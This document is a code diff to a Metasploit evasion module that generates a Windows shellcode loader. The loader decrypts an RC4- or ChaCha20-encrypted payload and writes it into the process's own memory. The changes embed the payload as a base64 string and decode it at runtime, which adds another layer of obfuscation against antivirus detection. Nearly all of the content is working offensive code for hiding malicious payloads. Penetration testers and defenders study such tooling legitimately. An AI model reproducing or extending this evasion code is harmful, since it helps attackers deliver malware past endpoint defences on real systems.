@@ -2,6 +2,7 @@ require 'metasploit/framework/compiler/mingw'
 require 'metasploit/framework/compiler/windows'
 class MetasploitModule < Msf::Evasion
   RC4 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h')
+  BASE64 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'base64.h')
   def initialize(info = {})
     super(
       merge_info(
@@ -184,6 +185,7 @@ class MetasploitModule < Msf::Evasion
 
   def headers
     @headers = "#include <Windows.h>\n"
+    @headers << "#include \"#{BASE64}\"\n"
     @headers << "#include \"#{RC4}\"\n" if datastore['CIPHER'] == 'rc4'
     @headers << "#include \"chacha.h\"\n" if datastore['CIPHER'] == 'chacha'
     @headers
@@ -436,7 +438,7 @@ class MetasploitModule < Msf::Evasion
 
   def exec_func
     %^
-        #{get_payload}
+        char* enc_shellcode = "#{get_payload}";
         DWORD exec(void *buffer)
         {
             void (*function)();
@@ -456,19 +458,21 @@ class MetasploitModule < Msf::Evasion
             DWORD old = 0;
             CLIENT_ID cID = {0};
             OBJECT_ATTRIBUTES OA = {0};
-            SIZE_T size = sizeof(shellcode);
+            int b64len = strlen(enc_shellcode);
+            PBYTE shellcode = (PBYTE)malloc(b64len);
+            SIZE_T size = base64decode(shellcode, enc_shellcode, b64len);
             PVOID bAddress = NULL;
             int process_id = GetCurrentProcessId();
             cID.UniqueProcess = process_id;
             NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &OA, &cID);
             NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             int n = 0;
-            PBYTE temp = (char*)malloc(sizeof(shellcode));
+            PBYTE temp = (PBYTE)malloc(size);
             @
     if datastore['CIPHER'] == 'rc4'
       @inject << %@
             #{Rex::Text.to_c key, Rex::Text::DefaultWrap, 'key'}
-            RC4(key, shellcode, temp, sizeof(shellcode));
+            RC4(key, shellcode, temp, size);
             NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);
             @
     else
@@ -478,7 +482,7 @@ class MetasploitModule < Msf::Evasion
             chacha_ctx ctx;
             chacha_keysetup(&ctx, key, 256, 96);
             chacha_ivsetup(&ctx, iv);
-            chacha_encrypt_bytes(&ctx, shellcode, temp, sizeof(shellcode));
+            chacha_encrypt_bytes(&ctx, shellcode, temp, size);
             NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);
             @
     end
@@ -524,10 +528,10 @@ class MetasploitModule < Msf::Evasion
     if datastore['CIPHER'] == 'chacha'
       chacha = Rex::Crypto::Chacha20.new(key, iv)
       p = chacha.chacha20_crypt(p)
-      Rex::Text.to_c p, Rex::Text::DefaultWrap, 'shellcode'
+      Rex::Text.encode_base64 p
     else
       opts = { format: 'rc4', key: key }
-      Msf::Simple::Buffer.transform(p, 'c', 'shellcode', opts)
+      Msf::Simple::Buffer.transform(p, 'base64', 'shellcode', opts)
     end
   end
 
